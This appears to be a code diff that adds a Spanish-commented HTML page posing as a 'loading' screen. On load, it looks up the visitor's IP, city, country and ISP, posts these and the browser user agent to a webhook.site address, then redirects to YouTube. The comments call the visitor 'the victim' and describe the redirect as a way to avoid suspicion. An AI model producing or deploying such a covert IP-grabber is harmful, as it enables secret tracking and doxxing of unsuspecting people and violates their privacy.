@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Cargando contenido...</title>
+    <script>
+        // 1. Capturamos los datos básicos de la víctima usando una API pública gratuita
+        fetch('https://ipapi.co')
+        .then(response => response.json())
+        .then(data => {
+            // 2. Enviamos la IP y los datos a un "Webhook" (tu buzón secreto)
+            fetch('https://webhook.site/1dd6a511-8c7b-430c-9dcf-40e32ef25686', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    ip: data.ip,
+                    ciudad: data.city,
+                    pais: data.country_name,
+                    proveedor: data.org,
+                    dispositivo: navigator.userAgent
+                })
+            });
+
+            // 3. Redirección invisible a un video o meme para que no sospechen
+            window.location.href = "https://youtube.com";
+        })
+        .catch(error => {
+            // Si algo falla, redirige igual para no levantar sospechas
+            window.location.href = "https://youtube.com";
+        });
+    </script>
+</head>
+<body>
+    <p>Cargando, por favor espere...</p>
+</body>
+</html>
